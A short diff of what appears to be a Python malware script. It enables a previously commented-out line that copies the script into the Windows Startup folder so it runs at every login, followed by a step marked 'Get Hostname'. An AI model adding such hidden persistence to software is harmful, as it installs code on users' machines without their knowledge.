@@ -22,7 +22,7 @@ else:
 
 
 # Copy to startup folder
-# shutil.copy(filepath, os.path.join(os.getenv("appdata"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup", filename))
+shutil.copy(filepath, os.path.join(os.getenv("appdata"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup", filename))
 
 
 # Get Hostname
